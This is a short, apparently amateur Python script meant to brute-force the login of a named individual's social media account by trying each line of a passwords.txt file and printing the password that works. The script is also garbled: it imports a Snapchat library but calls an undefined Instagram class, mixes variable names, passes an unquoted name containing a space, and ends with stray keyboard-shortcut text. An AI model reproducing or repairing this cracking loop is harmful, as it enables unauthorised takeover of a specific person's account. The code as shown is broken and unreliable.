#!/usr/bin/env python

from pysnap import Snapchat
import sys
import os

def crack(Mohammedsaudmansuri):
	print("now cracking: " + Mohammedsaudmansuri)
	Instagram = Instagram()
	passwords = open("passwords.txt","r")
	i = 0
	for password in passwords:
		result = instagram.login( mohammedsaudmansuri,password)
		if (result['logged']!=False):
			print("success: Mohammedsaudmansuri: " + Mohammedsaudmansuri + "\t password: " + password)
			break
		else:
			print(str(i))
			i+=1

names = open("users.txt","r")
for name in names:
	crack(Muhammed saudmansuri)
	Control + Shift + m
	esc
